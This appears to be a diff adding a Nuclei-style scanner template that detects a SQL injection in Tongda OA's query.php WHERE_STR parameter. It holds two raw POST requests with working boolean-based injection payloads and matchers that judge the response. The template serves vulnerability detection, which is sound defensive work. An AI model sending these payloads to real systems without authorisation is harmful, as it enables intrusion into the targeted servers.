@@ -1,0 +1,44 @@
+id: poc-yaml-tongda-oa-query-where-str-sqli
+info:
+  name: Tongda OA /query.php WHERE_STR SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in Tongda OA's query.php within the WHERE_STR parameter.
+
+http:
+  - raw:
+      - |
+        POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        WHERE_STR=-@`'` AND if((select length((select 123))=3),1,2*1e308)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - raw:
+      - |
+        POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        WHERE_STR=-@`'` AND if((select length((select 123))=1),1,2*1e308)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "错误，请联系管理员"
+          - "USER_PRIV=USER_PRIV.USER_PRIV"
